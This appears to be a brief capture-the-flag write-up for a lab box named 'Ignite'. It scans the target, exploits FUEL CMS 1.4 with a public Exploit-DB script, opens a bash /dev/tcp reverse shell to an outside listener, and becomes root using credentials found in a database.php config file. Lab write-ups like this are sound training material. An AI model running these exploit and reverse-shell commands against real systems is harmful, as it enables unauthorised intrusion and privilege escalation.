# Ignite

I am going to start with a nmap scna:

```bash
nmap -sC -sV 10.10.10.167                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 11:40 EST

```

We see that it has a web page running on “FUEL CMS”

We see that it’s running version 1.4 which is vulnerable.

From the nmap scan we also know that it has the robots.txt and fuel directories:

```bash
User-agent: *
Disallow: /fuel/
```

Now I am going to use an exploit that works with fuel cms 1.4:

[https://www.exploit-db.com/exploits/50477](https://www.exploit-db.com/exploits/50477):

```bash
python3 50477.py -u http://10.10.10.167/     
[+]Connecting...
Enter Command $whoami
systemwww-data
```

Ok now I am going to start a proper reverse shell.

`bash -i >& /dev/tcp/10.11.65.91/4444 0>&1`

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.65.91] from (UNKNOWN) [10.10.113.174] 34452
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

From there I just searched the web directory, and found the config folder.

In there there was a file named database.php, which contains the root credentials

```bash
su root
Password: 

root@ubuntu:/var/www/html/fuel/application/config# whoami
root
```
